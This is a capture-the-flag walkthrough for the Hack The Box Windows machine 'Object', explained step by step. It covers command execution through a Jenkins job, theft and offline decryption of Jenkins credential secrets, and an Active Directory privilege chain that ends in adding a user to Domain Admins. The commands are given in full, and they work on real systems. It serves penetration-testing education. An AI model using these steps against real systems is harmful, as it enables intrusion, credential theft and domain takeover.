# HTB: Object — Full Walkthrough
**Difficulty:** Hard | **OS:** Windows | **IP:** 10.129.96.147

---

## Table of Contents
1. [Mindset & Methodology](#mindset)
2. [Reconnaissance — Nmap](#recon)
3. [Web Enumeration — Port 80](#web80)
4. [Jenkins — Port 8080](#jenkins)
5. [Command Execution via Jenkins Job](#rce)
6. [Firewall Discovery](#firewall)
7. [Stealing Jenkins Credentials](#creds)
8. [Decrypting the Password](#decrypt)
9. [WinRM Foothold — oliver](#winrm-oliver)
10. [Active Directory Enumeration — BloodHound](#bloodhound)
11. [AD Abuse 1: ForceChangePassword — oliver → smith](#smith)
12. [AD Abuse 2: GenericWrite — smith → maria](#maria)
13. [Finding maria's Password — Engines.xls](#engines)
14. [WinRM as maria](#winrm-maria)
15. [AD Abuse 3: WriteOwner — maria → Domain Admins](#da)
16. [Root Flag](#root)
17. [Summary — The Full Attack Chain](#summary)

---

## 1. Mindset & Methodology <a name="mindset"></a>

Before touching the target, understand the **attacker's approach**:

- **Every open port is a potential entry point.** Web services, remote management, and unusual ports all deserve investigation.
- **Enumerate before you exploit.** Rushing to run exploits without understanding what's running wastes time and can break things.
- **Follow the data.** Configuration files, stored credentials, and service accounts tell you where to go next.
- **In Active Directory, access is a chain.** One account's permissions lead to another. BloodHound visualizes this chain so you can plan the entire escalation path before executing it.
- **When you're blocked, pivot.** Firewall blocking reverse shells? Find another way to get data out — write to files, use allowed protocols, read outputs from the tool itself.

---

## 2. Reconnaissance — Nmap <a name="recon"></a>

### What we did
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.96.147 -Pn
nmap -p 80,5985,8080 -sCV 10.129.96.147
```

### What we found
```
80/tcp   open  http    Microsoft IIS httpd 10.0  (Mega Engines website)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0  (WinRM)
8080/tcp open  http    Jetty 9.4.43.v20210629  (Jenkins)
```

### Why we do this
Nmap is always step one. We use `-p-` to scan **all 65535 ports** (not just the top 1000) because services are often hidden on non-standard ports. `--min-rate 10000` speeds it up. `-Pn` skips the host discovery ping (Windows often blocks ICMP which would cause Nmap to think the host is down).

The `-sCV` flag on the second scan runs **service version detection** (`-sV`) and **default scripts** (`-sC`) to fingerprint exactly what is running on each port.

### Hacker mindset
- Port **80** = website, look for info leakage, domains, links
- Port **5985** = WinRM (Windows Remote Management) — this is how we get a shell if we find credentials
- Port **8080** = running Jetty (Java web server), not IIS — this suggests a separate application, likely Jenkins based on the robots.txt disallow

---

## 3. Web Enumeration — Port 80 <a name="web80"></a>

### What we did
```bash
echo "10.129.96.147 object.htb" | sudo tee -a /etc/hosts
```
Browse to `http://object.htb` — static marketing page for "Mega Engines". The page mentions an "automation server" and links to port 8080.

### Why we do this
Always add discovered hostnames to `/etc/hosts`. Web applications often behave differently when accessed by hostname vs IP (virtual hosting). The link to port 8080 tells us what Jenkins is — the company's automation server.

### Hacker mindset
The website itself has nothing exploitable (no login forms, no dynamic content). But it gives us the hostname and confirms Jenkins is intentionally exposed. That becomes our primary target.

---

## 4. Jenkins — Port 8080 <a name="jenkins"></a>

### What we did
Browse to `http://object.htb:8080` — redirects to Jenkins login. Jenkins version **2.317** shown in footer.

**Registered a new account** (Jenkins allows self-registration by default).

### Why we do this
Jenkins is a Continuous Integration / Continuous Deployment (CI/CD) automation server. Its entire purpose is to **run code automatically**. If we can create and trigger a Jenkins job, we get code execution on the server — which in this case is a Windows machine.

We register an account because:
- No default credentials work
- No known unauthenticated exploits for this version
- Jenkins allows user registration by default unless the admin locked it down

### Hacker mindset
Always check if a web application allows self-registration before trying to brute force or exploit. It saves time. Once inside, the question becomes: *what can a low-privilege authenticated user do?*

---

## 5. Command Execution via Jenkins Job <a name="rce"></a>

### What we did
1. Click **New Item** → name it `pwn` → **Freestyle project**
2. Under **Build Triggers** → check **Build periodically** → enter `* * * * *` (every minute)
3. Under **Build Steps** → **Add build step** → **Execute Windows batch command**
4. Enter command: `whoami`
5. Save → wait 1 minute → check Console Output

**Result:**
```
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\pwn>whoami
object\oliver
```

### Why we do this
A Jenkins "Freestyle project" is essentially a script runner. The **Build periodically** trigger uses cron syntax — `* * * * *` means run every minute. This gives us a reliable way to execute any Windows command on the server.

We start with `whoami` to confirm:
1. We have execution
2. Which user the commands run as

Running as `object\oliver` tells us Jenkins is running under the `oliver` Windows user account. This matters because it defines what files and directories we can access.

### Why not a reverse shell?
We'll discover in the next step that **all outbound TCP is blocked by a firewall**. So we can't connect back to our Kali. Instead, we use the Jenkins job output (the Console Output page) as our data channel — we run commands and read the output in the browser.

### Hacker mindset
CI/CD tools are powerful because they're **designed to run commands**. That's not a vulnerability — it's the feature we're abusing. The attacker's goal here is simple: find a way to read output from commands we control.

---

## 6. Firewall Discovery <a name="firewall"></a>

### What we did
Changed the batch command to:
```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},Enabled,Action"
```

**Result:** A rule called `BlockOutboundDC` blocks **all outbound TCP**.

### Why we do this
Before spending time crafting reverse shells that won't work, we check the firewall rules. This is a critical enumeration step on Windows — Windows Firewall rules are readable by normal users and tell you exactly what traffic is allowed.

### Hacker mindset
When your reverse shell doesn't connect back, don't keep trying variations blindly. Diagnose the problem first. Check firewall rules, proxy settings, and network restrictions. Here, ICMP (ping) still worked outbound — which confirms the box is alive but TCP is blocked.

The implication: **we cannot get an interactive reverse shell**. We must do all our work through the Jenkins console output mechanism.

---

## 7. Stealing Jenkins Credentials <a name="creds"></a>

### What we did

**Step 1 — Find the admin user folder:**
```
powershell -c "ls ..\..\users"
```
Result: `admin_17207690984073220035`

**Step 2 — Read the admin's config.xml:**
```
type ..\..\users\admin_17207690984073220035\config.xml
```
Found encrypted password for user `oliver`:
```
{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}
```

**Step 3 — Read master.key:**
```
type ..\..\secrets\master.key
```
Result: `f673fdb0c4fcc339...`

**Step 4 — Read hudson.util.Secret (binary file, so base64 encode it):**
```
powershell -c "[convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte))"
```
Result: `gWFQFlTxi+xRdwcz6KgADwG+...`

### Why we do this
Jenkins stores credentials (used in pipelines and jobs) encrypted in XML files on disk. The encryption is not unbreakable — it uses a known algorithm (AES) with keys stored in predictable locations:

| File | Purpose |
|------|---------|
| `users/admin_*/config.xml` | Contains the encrypted credential |
| `secrets/master.key` | Key used to decrypt `hudson.util.Secret` |
| `secrets/hudson.util.Secret` | Key used to decrypt stored passwords |

Because Jenkins runs as `oliver` and these files are in oliver's home directory, we can read them all.

We base64 encode `hudson.util.Secret` because it's a **binary file** — printing it directly would garble the output. Base64 encoding makes it safe to copy/paste as text.

### Hacker mindset
Always look for **stored credentials** when you have file system access. CI/CD systems like Jenkins need to store credentials to connect to other systems (source control, deployment targets). Those stored credentials are gold — they often reuse passwords across services.

The path `..\..\` from the workspace navigates up to the `.jenkins` root directory. Knowing the Jenkins directory structure (publicly documented) lets you go straight to the valuable files.

---

## 8. Decrypting the Password <a name="decrypt"></a>

### What we did
On Kali:
```bash
# Save master.key
echo -n "f673fdb0c4fcc339..." > master.key

# Decode hudson.util.Secret from base64 to binary
echo "gWFQFlTxi+xRdwcz..." | base64 -d > hudson.util.Secret

# Create a credentials XML with the encrypted password
cat > config.xml << 'EOF'
<com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
  <username>oliver</username>
  <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
</com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
EOF

# Download the decryption script
wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py

# Install dependency and run
pip install pycryptodome
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
```

**Result:** `c1cdfun_d2434`

### Why we do this
Jenkins uses AES encryption. The `pwn_jenkins` script implements the exact same decryption algorithm Jenkins uses internally. Given the three files (master.key, hudson.util.Secret, credentials XML), it can reverse the encryption completely — no brute force needed.

### Hacker mindset
Encryption is only as strong as the key management. Jenkins stores everything needed to decrypt on the same disk. This is a design trade-off (usability vs security), but for a pentester it means: **if you can read the files, you can decrypt the secrets**.

---

## 9. WinRM Foothold — oliver <a name="winrm-oliver"></a>

### What we did
```bash
evil-winrm -i 10.129.96.147 -u oliver -p 'c1cdfun_d2434'
```

```powershell
type C:\Users\oliver\Desktop\user.txt
# b814a[redacted]1c7f9f72046
```

### Why we do this
WinRM (port 5985) is Windows' remote management protocol — like SSH for Windows. `evil-winrm` is a Ruby tool that wraps WinRM into an interactive shell with extra features (file upload/download, PowerShell modules).

We try the decrypted Jenkins credential directly on WinRM because **password reuse is extremely common**. The admin stored oliver's Windows password in Jenkins — and oliver used the same password for his Windows account.

### Hacker mindset
Always try discovered credentials against every available service. One credential finding can open multiple doors. Here, the Jenkins credential = the Windows account credential = WinRM access.

---

## 10. Active Directory Enumeration — BloodHound <a name="bloodhound"></a>

### What we did
The machine already had SharpHound.exe and a completed zip in oliver's Documents folder. Downloaded the zip and imported into BloodHound.

```powershell
download C:\Users\oliver\Documents\20260609084858_BloodHound.zip
```

On Kali:
```bash
sudo neo4j start
bloodhound &
# Import zip, mark oliver as Owned
# Analysis → Find Shortest Paths to Domain Admins
```

**Result:** `oliver → ForceChangePassword → smith → GenericWrite → maria → WriteOwner → Domain Admins`

### Why we do this
In Active Directory, **permissions are everything**. A user might not have admin rights directly, but might have permissions *over other objects* that eventually lead to admin. Manually checking every object's ACL is impractical — BloodHound automates this by:

1. **SharpHound** — runs on the target, collects all AD objects, group memberships, and ACLs
2. **BloodHound** — loads the data into a graph database and finds attack paths using graph theory

The "Shortest Path to Domain Admins" query finds the minimum number of hops from your owned user to DA.

### What each edge means
| Edge | Meaning |
|------|---------|
| `ForceChangePassword` | Can reset another user's password without knowing the current one |
| `GenericWrite` | Can write to any non-protected attribute of an AD object |
| `WriteOwner` | Can take ownership of an AD object (then grant yourself any rights) |

### Hacker mindset
In AD environments, **don't think about what you have — think about what you can reach**. A chain of three low-severity permissions combines into full domain compromise. BloodHound makes these invisible relationships visible.

---

## 11. AD Abuse 1: ForceChangePassword — oliver → smith <a name="smith"></a>

### What we did
In Evil-WinRM as oliver, uploaded PowerView.ps1 then:

```powershell
Import-Module .\PowerView.ps1
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
```

Then connected as smith:
```bash
evil-winrm -i 10.129.96.147 -u smith -p 'Password123!'
```

### Why we do this
`ForceChangePassword` is an AD permission that lets you set a user's password to anything — without knowing their current password. PowerView's `Set-DomainUserPassword` automates this.

We need to be smith because smith has the next permission in the chain (`GenericWrite` over maria). We can't abuse that permission as oliver.

### Why PowerView?
PowerView is a PowerShell library for AD enumeration and manipulation. It wraps complex LDAP/AD calls into simple functions. It's part of PowerSploit and is the standard tool for AD abuse in engagements.

### Hacker mindset
`ForceChangePassword` is a legitimate AD delegation feature (help desk workers can reset passwords). But when it's misconfigured on a regular user account rather than a help desk group, it becomes an attack vector. Always check what you can **do to other objects**, not just what you can do directly.

---

## 12. AD Abuse 2: GenericWrite — smith → maria <a name="maria"></a>

### What we did
As smith with PowerView:

```powershell
# Write a script to copy maria's files
Set-Content -Path C:\programdata\check.ps1 -Value 'Copy-Item C:\Users\maria\Desktop\Engines.xls C:\programdata\Engines.xls'

# Set that script as maria's logon script via GenericWrite
Set-DomainObject -Identity maria -SET @{scriptpath='C:\programdata\check.ps1'}
```

Wait ~5-10 seconds → the file appears at `C:\programdata\Engines.xls`

```powershell
download C:\programdata\Engines.xls
```

### Why GenericWrite allows this
`GenericWrite` lets you write to any **non-protected** attribute of an AD user object. The `scriptpath` attribute defines a logon script — a script that runs every time the user logs in (or in this case, every time an automated task simulates a login).

The box has a scheduled task running as maria that continuously executes whatever is set as her logon script. This is confirmed because the file appears within seconds of setting the scriptpath.

### Why we target Engines.xls
After listing maria's Desktop directory (by setting the script to `dir C:\Users\maria\Desktop > C:\programdata\out.txt`), we found `Engines.xls` — an Excel file that likely contains credentials based on its name and context.

### Hacker mindset
`GenericWrite` has many potential abuses. The logon script method is ideal here because:
1. We can't get a reverse shell (firewall)
2. The automation runs repeatedly — we get results within seconds
3. We can chain multiple scripts to exfiltrate any file we want

Think of it as using maria's account as a **file copy robot** that we control via her AD attributes.

---

## 13. Finding maria's Password — Engines.xls <a name="engines"></a>

### What we found
```
Name                      | Chamber Username | Chamber Password
Internal Combustion Engine | maria            | d34gb8@
Stirling Engine            | maria            | 0de_434_d545
Diesel Engine              | maria            | W3llcr4ft3d_4cls
```

### Testing passwords
```bash
netexec winrm 10.129.96.147 -u maria -p maria-pass.txt
```

**Result:** `W3llcr4ft3d_4cls` — `(Pwn3d!)`

### Why we do this
The Excel file is an inventory spreadsheet with passwords stored in plaintext. This is a common finding in real engagements — employees store credentials in Excel/Word documents on their desktops.

We test all three passwords against WinRM because we don't know which one is maria's current Windows password. `netexec` (formerly crackmapexec) makes spray testing fast.

### Hacker mindset
**People are the weakest link.** A user keeping a password spreadsheet on their desktop defeats all the technical security controls. Finding and testing all discovered credentials is essential — even if they look like credentials for other systems, they might be reused.

---

## 14. WinRM as maria <a name="winrm-maria"></a>

### What we did
```bash
evil-winrm -i 10.129.96.147 -u maria -p 'W3llcr4ft3d_4cls'
```

### Why
We now have access as maria, who has `WriteOwner` over Domain Admins — the final step to full compromise.

---

## 15. AD Abuse 3: WriteOwner — maria → Domain Admins <a name="da"></a>

### What we did
As maria, imported PowerView then:

```powershell
# Step 1: Take ownership of the Domain Admins group
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria

# Step 2: As owner, grant maria full rights over the group
Add-DomainObjectAcl -PrincipalIdentity maria -TargetIdentity "Domain Admins" -Rights All

# Step 3: Add maria to Domain Admins
net group "Domain Admins" maria /add /domain
```

Then **exited and reconnected** to refresh the session token:
```bash
evil-winrm -i 10.129.96.147 -u maria -p 'W3llcr4ft3d_4cls'
```

### Why three steps?
This is how Windows permission delegation works:

1. **WriteOwner** only lets you *change who owns the object* — it doesn't give you any other rights yet
2. **Once you're the owner**, Windows lets owners modify the object's DACL (security descriptor) regardless of existing ACEs — so we grant ourselves `All` rights
3. **With All rights**, we can finally add members to the group

### Why reconnect?
Windows access tokens (your "session credentials") are generated at login time and include group memberships at that moment. Adding yourself to a group mid-session doesn't update your current token. You must **start a new session** to get a token that includes the new group membership.

### Hacker mindset
`WriteOwner` is an often-overlooked permission. Many defenders focus on `WriteDACL` or `GenericAll`, but ownership is even more powerful — it bypasses the DACL entirely. The three-step process mirrors what an admin would do legitimately when managing group ownership.

---

## 16. Root Flag <a name="root"></a>

```powershell
type C:\Users\Administrator\Desktop\root.txt
# 454a877[redacted]393c4c
```

---

## 17. Summary — The Full Attack Chain <a name="summary"></a>

```
[Attacker: 10.10.16.84]
        |
        | HTTP port 8080
        v
[Jenkins 2.317]
  - Register account
  - Create Freestyle job
  - Schedule every minute
  - Execute Windows batch commands
  - Read Jenkins credential files via job output
        |
        | Decrypt encrypted password
        | oliver:c1cdfun_d2434
        v
[WinRM — oliver]  →  user.txt
  - Upload SharpHound
  - Collect BloodHound data
  - Upload PowerView
        |
        | ForceChangePassword
        v
[WinRM — smith]
  - Upload PowerView
  - GenericWrite on maria
  - Set logon script → copy Engines.xls
        |
        | Engines.xls contains passwords
        | maria:W3llcr4ft3d_4cls
        v
[WinRM — maria]
  - Upload PowerView
  - WriteOwner on Domain Admins
  - Take ownership → grant self All rights
  - Add maria to Domain Admins
  - Reconnect for new token
        |
        v
[Domain Admin]  →  root.txt
```

### Key Lessons

| Lesson                                         | Application                                                        |
| ---------------------------------------------- | ------------------------------------------------------------------ |
| Jenkins stores decryptable credentials         | Always enumerate CI/CD tool config files                           |
| Firewall blocks reverse shells                 | Use the tool's own output mechanism as your data channel           |
| Password reuse                                 | Try every found credential against every available service         |
| AD permissions chain                           | One weak ACE leads to the next — map the full path with BloodHound |
| Logon scripts = code execution as another user | GenericWrite on users is extremely powerful                        |
| Object ownership bypasses ACLs                 | WriteOwner is as dangerous as WriteDACL                            |
| Windows tokens are static per session          | Always reconnect after adding yourself to privileged groups        |
| Credentials in Excel files                     | Users store passwords insecurely — always enumerate desktop files  |
